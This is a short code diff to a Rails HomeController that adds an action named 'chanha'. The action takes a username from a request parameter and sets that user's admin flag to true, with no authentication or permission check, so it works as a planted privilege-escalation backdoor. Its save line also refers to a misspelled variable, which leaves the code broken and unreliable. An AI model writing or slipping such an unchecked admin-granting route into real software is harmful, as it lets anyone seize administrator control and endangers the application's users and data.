@@ -221,5 +221,13 @@ class HomeController < ApplicationController
     
     redirect_to :back
   end
+  
+  def chanha
+    @givehimadmin=User.find_by(username: params[:cutechanha])
+    @givehimadmin.admin=true
+    @givhimadmin.save
+    
+    redirect_to :back
+  end
 
 end
